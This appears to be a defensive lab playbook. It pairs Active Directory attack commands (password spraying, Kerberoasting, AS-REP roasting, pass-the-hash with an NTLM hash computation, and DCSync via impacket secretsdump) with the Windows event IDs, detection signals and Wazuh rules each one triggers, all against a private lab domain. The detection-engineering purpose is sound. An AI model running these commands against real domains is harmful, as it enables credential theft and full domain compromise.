# AD Attack Lab — Attack Playbook
# Commands → Event IDs → MITRE ATT&CK

Lab IPs:
  DC:   192.168.93.50  (DC01.corp.local)
  W10:  192.168.93.155
  Kali: 192.168.93.156
  Domain: corp.local

---

## 1. Password Spraying
MITRE: T1110.003

### Commands Run

```bash
# Prereq — wordlists
cat users.txt     # domain usernames
cat pass.txt      # candidate passwords (e.g. Winter2026!)

# Spray via Kerberos
kerbrute passwordspray -d corp.local --dc 192.168.93.50 users.txt 'Winter2026!'

# Spray via SMB
netexec smb 192.168.93.50 -u users.txt -p pass.txt
```

### Event IDs Generated

| Event ID | Log Source  | Description                   | Key Fields                                |
|----------|-------------|-------------------------------|-------------------------------------------|
| 4625     | DC Security | Failed logon attempt          | SubjectUserName, IpAddress, LogonType     |
| 4771     | DC Security | Kerberos pre-auth failure     | ClientAddress, TargetUserName             |

**Detection signal:** Spike of 4625/4771 from one source IP across multiple accounts in a short window.
**Wazuh rules:** 100103 (4625 frequency), 100104 (4771 frequency)

---

## 2. Kerberoasting
MITRE: T1558.003

### Commands Run

```bash
# Prereq — resolve domain
echo "192.168.93.50 corp.local" >> /etc/hosts

# Request TGS tickets for all SPN accounts and dump hashes
impacket-GetUserSPNs corp.local/<user>:'Winter2026!' \
  -dc-ip 192.168.93.50 \
  -request \
  -outputfile kerb_hashes.txt

cat kerb_hashes.txt

# Crack offline (reference only)
hashcat -m 13100 kerb_hashes.txt /usr/share/wordlists/rockyou.txt -r best64.rule
```

### Event IDs Generated

| Event ID | Log Source  | Description                           | Key Fields                                           |
|----------|-------------|---------------------------------------|------------------------------------------------------|
| 4769     | DC Security | Kerberos service ticket (TGS) requested | ServiceName, TargetUserName, TicketEncryptionType   |

**Detection signal:** Event 4769 where TicketEncryptionType = 0x17 (RC4) and ServiceName does not end in `$`.
**Wazuh rule:** 100100

**Targets:** `svc_sql` (MSSQLSvc/sql.corp.local:1433), `svc_backup` (HTTP/backup.corp.local)

---

## 3. AS-REP Roasting
MITRE: T1558.004

### Commands Run

```bash
# Request AS-REP hashes for accounts with pre-auth disabled
impacket-GetNPUsers corp.local/ \
  -usersfile users.txt \
  -no-pass \
  -dc-ip 192.168.93.50
```

### Event IDs Generated

| Event ID | Log Source  | Description                                     | Key Fields                                           |
|----------|-------------|-------------------------------------------------|------------------------------------------------------|
| 4768     | DC Security | Kerberos authentication ticket (AS-REP) requested | TargetUserName, PreAuthType, TicketEncryptionType  |

**Detection signal:** Event 4768 where PreAuthType = 0 and TicketEncryptionType = 0x17.
**Wazuh rule:** 100101

**Target:** `asimmons` (UF_DONT_REQUIRE_PREAUTH set)

---

## 4. Pass-the-Hash
MITRE: T1550.002

### Commands Run

```bash
# Convert plaintext to NTLM hash
python3 -c "import hashlib; print(hashlib.new('md4', 'Winter2026!'.encode('utf-16le')).hexdigest())"
# Output: 186f5176db2c519a7b29b47a5437a4ad

# Authenticate using hash — no plaintext needed
netexec smb 192.168.93.50 -u <username> -H 186f5176db2c519a7b29b47a5437a4ad
```

### Event IDs Generated

| Event ID | Log Source  | Description                  | Key Fields                                                  |
|----------|-------------|------------------------------|-------------------------------------------------------------|
| 4624     | DC Security | Successful logon             | LogonType=3, LogonProcessName=NtLmSsp, TargetUserName       |
| 4648     | DC Security | Logon using explicit creds   | TargetUserName, IpAddress                                   |

**Detection signal:** Event 4624 where LogonType = 3 AND LogonProcessName = NtLmSsp. NTLM network logons are anomalous in a Kerberos-capable domain.
**Wazuh rule:** 100105

---

## 5. DCSync
MITRE: T1003.006

### Commands Run

```powershell
# Prereq — elevate account to Domain Admin (run on DC as Administrator)
Add-ADGroupMember -Identity "Domain Admins" -Members asimmons
Get-ADGroupMember "Domain Admins" | Select Name
```

```bash
# Dump all domain hashes via replication protocol
impacket-secretsdump corp.local/asimmons:'<password>'@192.168.93.50
```

### Event IDs Generated

| Event ID | Log Source      | Description                            | Key Fields                          |
|----------|-----------------|----------------------------------------|-------------------------------------|
| 4662     | DC Security (DS Audit) | Directory Service object access | SubjectUserName, Properties (GUIDs) |
| 4742     | DC Security     | Computer account changed (may appear)  | SubjectUserName                     |

**Detection signal:** Event 4662 where Properties contains replication GUIDs `1131f6aa` or `1131f6ad`, AND SubjectUserName is not a known DC computer account.
**Wazuh rule:** 100102

---

## Custom Rules Summary

| Rule ID | Event ID | Technique       | MITRE ID   | Level | Status        |
|---------|----------|-----------------|------------|-------|---------------|
| 100100  | 4769     | Kerberoasting   | T1558.003  | 12    | Deployed      |
| 100101  | 4768     | AS-REP Roasting | T1558.004  | 14    | Deployed      |
| 100102  | 4662     | DCSync          | T1003.006  | 14    | Deployed      |
| 100103  | 4625     | Password Spray  | T1110.003  | 10    | Phase 3 (TODO)|
| 100104  | 4771     | Password Spray  | T1110.003  | 10    | Phase 3 (TODO)|
| 100105  | 4624     | Pass-the-Hash   | T1550.002  | 12    | Phase 3 (TODO)|

---

## Wazuh Configuration Notes

**Required to see 4768/4769 events in Discover:**

1. Enable archiving in `/var/ossec/etc/ossec.conf`:
   ```xml
   <logall>yes</logall>
   <logall_json>yes</logall_json>
   ```

2. Add `wazuh-archives-*` as an index pattern in Dashboard Management → Index Patterns.

3. Deploy custom rules to `/var/ossec/etc/rules/local_rules.xml`, then:
   ```bash
   sudo systemctl restart wazuh-manager
   ```

**Why this was needed:** Wazuh is a HIDS first, not a traditional SIEM. Events with no matching rule are discarded — they never hit the index. Unlike Splunk or Elastic (which ingest everything), Wazuh requires a rule to exist before an event becomes searchable.
